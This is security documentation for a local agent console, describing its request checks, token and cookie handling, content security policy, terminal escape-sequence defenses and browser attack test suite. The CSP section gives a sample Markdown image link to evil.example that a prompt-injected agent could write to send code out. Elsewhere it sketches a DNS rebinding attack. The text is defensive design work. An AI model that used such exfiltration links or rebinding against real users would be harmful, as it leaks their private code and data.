# Server and browser

The Ostra console is a web page. The process that serves it can run any command that your user can run. This
page tells how the server decides that a request comes from your own signed-in browser tab. It also tells how
the page prevents text from agents, repositories, and MCP servers from running as code. Every check on this page
runs in one middleware, `guard` in [`crates/ostra-server/src/api.rs`](../../crates/ostra-server/src/api.rs).
The sign-in logic is in [`crates/ostra-server/src/auth.rs`](../../crates/ostra-server/src/auth.rs).

For the threats that these defenses answer, see the [threat model](threat-model.md). For the position of the
server among the crates and for its REST and WebSocket surface, see [Server](../architecture/server.md).

## Where the server listens

Ostra binds to `127.0.0.1` unless you pass `--bind` or set `server.bind` in `config.toml`. On a loopback bind,
nothing on the network can connect. [Install](../start/install.md) tells how to get remote access through an SSH
tunnel or a TLS reverse proxy.

A loopback server also serves the console at a private host name of the form `ostra-<16 hex>.localhost`. Ostra
selects this name one time at random and keeps it in the registry. Browsers resolve every `*.localhost` name to
this machine, so the name works without DNS setup. The reason for the name is the cookie:

- A browser sends a cookie for `127.0.0.1` to every other port on `127.0.0.1`. One of these ports can be a dev
  server or a tool that a hostile page can control.
- A browser does not send a cookie for a random `*.localhost` name to other names.

The server redirects page loads on `127.0.0.1:<port>` to the private name, and it keeps the `#token=` fragment.
The server refuses API calls on `127.0.0.1:<port>` with a message that names the correct address. To turn off
the private name, set `server.use_ip_host = true`.

## The Host check

Each request must have a `Host` header from a fixed list. If it does not, it gets `421 Misdirected Request`. The
list holds these names:

- `127.0.0.1:<port>`, `localhost:<port>`, and `[::1]:<port>`, and also the private name.
- On a `0.0.0.0` bind, every interface address and the host name of the machine with and without `.local`. The
  interface addresses include container and VM bridges, because a local container can connect through one.
- The names that you add with `--allow-host` or `server.allowed_hosts`, such as the domain of a reverse proxy.

This check is the DNS rebinding defense. A hostile page at `evil.example` can make its own name resolve to
`127.0.0.1`. But the browser still sends `Host: evil.example:<port>`, which is not on the list. The CSP on the
refusal names no host. Thus a refused request gets no information about the allowed names of the server.

## The Origin and Sec-Fetch checks

For each request under `/api/` and for the `/ws` upgrade, the server refuses with `403` if one of these
conditions is true:

1. **`Origin` is present and is not `http://` or `https://` followed by an allowed host.** This check stops a
   page on another site when it calls the API with `fetch` or a form.
2. **`Sec-Fetch-Site` is `cross-site` or `same-site`.** Some requests have no `Origin`. A page on another
   `localhost` port counts as same-site, so the browser also sends a `SameSite` cookie with its requests. The
   browser sets `Sec-Fetch-Site`, and a page cannot change it. Thus this header separates those requests from the
   `same-origin` requests of the console.
3. **`Sec-Fetch-Dest` is not `empty`, `websocket`, or `document`.** The console uses only `fetch`, the socket,
   and download links to get to the API. An `image`, `script`, or `iframe` request is page content that tries
   to get to the API. An example is a Markdown image with an API URL that an agent wrote.

The server sends no CORS headers. Thus no other origin can read a response, also when the browser sends a
request.

## Sign-in tokens

`ostra` prints and opens a URL such as `http://ostra-….localhost:7878/#token=<64 hex>`. For a running server,
`ostra url` makes a new URL.

- **The token is 256 random bits.** An attacker cannot guess it in practice.
- **It is in the fragment.** Browsers do not send the part after `#` to the server or in a `Referer`. Thus the
  token never shows in a request line, a proxy log, or the server log. The console reads the token and sends it
  one time in the body of `POST /api/auth/exchange`. Then the console removes it from the address bar.
- **It works one time.** The registry stores only its SHA-256 hash and an expiry. The exchange replaces the
  stored value with `used:<time>` through a compare-and-replace. Thus if two tabs use the same token at the same
  time, only one tab succeeds. A second try gets a message that the link is already used and how long ago. It
  does not get a generic failure.
- **It expires after 15 minutes.**
- **Ostra limits failures for each address.** A non-loopback address gets five failed exchanges each minute.
  Ostra does not limit loopback, because a limit there lets a local process lock you out with failures on
  purpose.

Clipboard managers and link previewers that open a URL to show a preview use the token. If sign-in says that
the link is used, run `ostra url` again. [Troubleshooting](../start/troubleshooting.md) lists the other sign-in
errors.

## The session cookie

A successful exchange sets `ostra_session`, a new 256-bit value, as `HttpOnly; SameSite=Strict; Path=/`. The
server adds `Secure` when the browser connected to Ostra over HTTPS. The server finds HTTPS from the `Origin`
header, which the browser sets itself. It does not read `X-Forwarded-Proto`, because any client can send that
header.

- **Stored hashed.** The registry keeps `auth:cookie:<sha256>` with these data: the id of the sign-in, the
  creation time, the last-seen time, a user agent clipped to 300 characters, and the address. The server never
  writes the cookie value itself to disk.
- **30 days, checked on the server.** The server calculates the expiry from the creation time on every check.
  It does not take the expiry from the browser.
- **Listed and revoked.** Settings > Sign-in and `ostra sessions` show every live sign-in. A revoke from the
  server takes effect immediately. It also closes the open WebSockets of that browser through a broadcast
  channel. A revoke from the CLI, which is another process, takes effect in five seconds or less. The reason is
  that the server trusts a checked cookie for at most five seconds before it reads the registry again.
- **Survives a restart.** Sign-ins are in the registry. Thus a restart of the server does not sign you out, and
  `ostra url` can make a token for a server that already runs.

## Response headers

Every response, refusals included, has these headers:

| Header | Value | Why |
| --- | --- | --- |
| `Content-Security-Policy` | See below | Stops injected text when it tries to run or load anything |
| `X-Frame-Options` | `DENY` | No other page can frame the console |
| `X-Content-Type-Options` | `nosniff` | The browser never runs a file served as text as script |
| `Referrer-Policy` | `no-referrer` | Links that an agent wrote do not get the address of the console |
| `Cache-Control` | `no-store` on `/api` | Session data does not stay in the browser cache |

## The content security policy

```
default-src 'self'; script-src 'self'; worker-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; font-src 'self' data:; connect-src 'self' ws://<host> wss://<host>;
object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; frame-src 'none';
manifest-src 'self'
```

The policy is a list of things that injected text cannot do:

- **Run script.** Only script files from the origin of the server run. No inline `<script>`, no `onerror=`, no
  `javascript:` URL, and no `eval` run.
- **Load a remote image.** `img-src` allows only the files of the server and `data:` URLs. This rule is more
  important than it seems. A prompt-injected agent can write `![](https://evil.example/?d=<your code>)` in a
  message. A browser that loads this image sends data out. Here the browser refuses the request.
- **Connect anywhere else.** `connect-src` allows only the server and its own WebSocket.
- **Frame, embed, or be framed.** `frame-src`, `object-src`, and `frame-ancestors` are all closed.
- **Change where relative URLs or forms go.** `base-uri 'none'` and `form-action 'self'` prevent this.

`style-src` allows inline styles because React sets them. Inline styles cannot run code.

### Why the static pages carry the same policy

A static host serves the homepage and these docs as plain files, and it sends no security headers. Thus the
site build puts the policy in a `<meta http-equiv="Content-Security-Policy">` tag in each page
([`site/vite.config.ts`](../../site/vite.config.ts)). The console screenshot on the homepage is the real console,
built in mock mode. It gets its own meta tag ([`web/vite.config.ts`](../../web/vite.config.ts)).

These meta policies must stay equal to the policy of the server, directive for directive. The only exceptions
are the differences that a static page requires:

- There is no WebSocket to allow.
- `frame-ancestors` has no meta form.
- `form-action` is `'none'`, because the site has no forms.
- Only the homepage can frame its own console screenshot.

The reason is that the docs render repository Markdown, and the console screenshot renders sample agent output.
If a static page has a less strict policy than the server, a string can run on the site. This is true also when
the browser security suite proves that the string is harmless in the console. When you change the policy of the
server in `api.rs`, change both Vite configs in the same commit.

## Internal endpoints

Harness CLIs call back into Ostra through two endpoints:

- `/internal/policy`: the hook bridge, which asks the policy about each tool call.
- `/internal/mcp`: the MCP shim of Ostra.

These endpoints are not for browsers, and they have different guards:

- **Local peers only.** A request from an address that is not loopback or an interface of this machine gets
  `403`. This is true also when the server listens on every interface, because a harness always runs on the same
  machine.
- **No browser requests.** A browser page on this machine is also a local peer, but it always sends `Origin` or
  `Sec-Fetch-Site`. The server refuses each request with one of these headers.
- **A per-execution bearer token.** Each harness execution gets its own token. The bridge checks two things:
  that the token belongs to a running execution, and that the harness in the hook is the harness of the
  execution. When the execution ends, the token stops working. Then the bridge denies each tool call with an
  instruction to stop. The token is in the harness directory of the execution, which the policy classifies as a
  secret path. Thus one agent cannot read the token of another execution. [Executors](../internals/executors.md)
  describes the hook bridge.

## WebSocket checks

The `/ws` upgrade goes through the same Host, Origin, Sec-Fetch, and cookie checks as REST. After the upgrade,
the socket applies its own limits ([`crates/ostra-server/src/ws.rs`](../../crates/ostra-server/src/ws.rs)):

| Limit | Value |
| --- | --- |
| Message and frame size | 1 MiB |
| One `term_input` message | 64 KiB |
| Subscribed channels per socket | 256 |
| Terminal resize | 1 to 1000 columns, 1 to 500 rows. The socket refuses other values |
| Sign-in re-check | Every 5 seconds, and immediately on a revoke from this server |

An open socket checks its cookie again on the same five-second schedule as REST. Thus an expired or revoked
sign-in disconnects a tab, also when the tab only listens.

## Terminal output

Harness CLIs run in a PTY, and the Terminal tab streams the PTY bytes to xterm.js in the browser. Terminal
output can contain escape sequences, and some sequences ask the terminal to reply. If the terminal in the
browser answers, a harness or a file that it printed can make the terminal type into the harness.

- **The server answers terminal queries, not the browser.** The server replies to device and status queries
  itself, one time, for any number of browsers. It sends back only digit parameters. Thus a reply cannot contain
  text that the program that asked selected
  ([`crates/ostra-exec-harness/src/pty.rs`](../../crates/ostra-exec-harness/src/pty.rs)).
- **The browser mutes the replies of xterm.js.** The browser removes each query sequence that xterm.js answers
  before xterm.js can answer it
  ([`web/src/screens/execution/terminalSafety.ts`](../../web/src/screens/execution/terminalSafety.ts)).
- **OSC 52 clipboard writes and title sequences do not get to the page.** The browser suite sends both and
  checks the result.
- **OSC 8 links open only for `http` and `https`**, only after a confirmation that shows the address, and in a
  new tab with `noopener` and `noreferrer`.
- **The PTY input must be identical with or without an attached browser.** The browser suite checks this. It
  compares the bytes that the harness received with the bytes of a run without a browser.

Ostra writes terminal transcripts with mode `0600` in a `0700` directory, because harness output can contain
secrets.

## Rendering untrusted text

Another person can write the text of agent messages, tool output, repository files, branch names, MCP metadata,
session titles, and memory entries. The console uses all of this text only as data.

- **React escapes it.** No code inserts text with `dangerouslySetInnerHTML`.
- **Markdown goes through `react-markdown` with no raw HTML.** Links go through the default URL filter of React
  Markdown, which removes `javascript:` and similar schemes. Images accept only `data:image/` URLs. An image with
  a different source shows as its alt text
  ([`web/src/components/Markdown.tsx`](../../web/src/components/Markdown.tsx)).
- **Uploads never render inline.** The console shows SVG and HTML uploads as files. The server sends downloads
  as `application/octet-stream` with `Content-Disposition: attachment`.
- **Browser storage holds no secrets.** The console writes no transcript, token, or key to localStorage,
  sessionStorage, IndexedDB, or Cache Storage.

The docs that you read now use their own renderer
([`design/src/docs/Markdown.tsx`](../../design/src/docs/Markdown.tsx)). This renderer walks the Markdown syntax
tree and builds each element itself. It removes raw HTML, except `<br>`. A link with a scheme other than `http`,
`https`, or `mailto` shows as plain text. An image loads only when its path resolves to a file in `docs/images`.
The build bundles these files into the site, so every image comes from the origin of the site. Any other image
shows as a link with its alt text as the label.

The renderer draws a fenced `mermaid` block as SVG ([`design/src/docs/Diagram.tsx`](../../design/src/docs/Diagram.tsx)).
Mermaid loads only on a page that has such a block, and it runs in strict mode, which ignores click callbacks.
Labels are SVG text, never HTML. Thus a label cannot contain an image or markup. The renderer unwraps the links
that a `click` line makes, so a diagram cannot go out of the page. The directives and frontmatter of a diagram
cannot turn either setting on again. A block that does not parse shows its source.

The documentation books of the console use the same renderer. It is in the design system (`design/src/docs/`),
so the site and the console share one implementation. A book comes to the renderer as structured JSON, and the
console escapes every field before the field becomes Markdown. A book has no bundled images, so every image in
it shows as a link. An exported book is a single HTML file with no script:

- The diagrams are the SVG that the browser already drew.
- The export removes scripts, frames, forms, event handlers, and links or images to another origin.
- The meta policy of the file (`default-src 'none'; style-src 'unsafe-inline';
  img-src data:`) lets it load nothing.

## The browser security suite

Unit tests can show that the server sets a header. They cannot show that a real browser refuses the things that
the header must refuse. [`tests/browser`](../../tests/browser/README.md) runs the console and the site in a real
Chromium and attacks them.

```bash
cd tests/browser && npm test
```

The suite does these steps:

1. It builds the server and the web UI.
2. It starts a scratch server under `/tmp/pw-browser` with its own config, data directory, master key, and
   `HOME`.
3. It runs a complete YOLO session against a local fake model API.

Nothing goes out of the machine.

Each attack string has one of two effects if it runs or loads. It sets `window.__pwned`, or it requests a canary
URL on the fake server with an id that names the render path. A shared fixture fails the test in these cases:

- The string sets `window.__pwned` or requests the canary URL.
- A CSP violation occurs on the origin of the app.
- An unexpected dialog, popup, or navigation occurs.

| Spec | What it attacks |
| --- | --- |
| `render` | Every place that shows agent or repository text: messages, Bash and MCP output, artifacts, the completion report, titles, file names and contents, branches and commits, MCP metadata, memory, skills, decisions, search |
| `terminal` | OSC 52, OSC 8, title sequences, and device queries through xterm.js, and the PTY input comparison |
| `cross-origin` | Attacker pages on another `localhost` port and on another site: forms, `fetch`, WebSocket, tags, frames, a navigation to every GET route in `api.rs`, DNS rebinding, and page content that tries to get to `/api` |
| `signin` | The token goes out of the URL, no request contains it, and the token that the browser profile keeps is already used |
| `uploads` | SVG and HTML uploads through chips, the artifact view, and raw links |
| `storage` | localStorage, sessionStorage, IndexedDB, and Cache Storage after a full session |
| `shortcuts` | The web app manifest and its icons load from the app origin under the policy of the server. A shortcut recorded in Settings stays in the localStorage entry of this workspace and runs |
| `site` | The homepage and docs served the same as a static host serves them, a docs page full of attack strings, search with hostile input, the console screenshot that loads only same-origin files, and cross-origin messages to it |
| `books` | A documentation book with attack strings in every field: the Docs list, every page of the reader, its Mermaid diagrams, search, and the exported HTML file, which must contain no script and render under its own meta policy |

Each new browser surface, a console screen or a site page, gets a spec here and the same policy as the server.
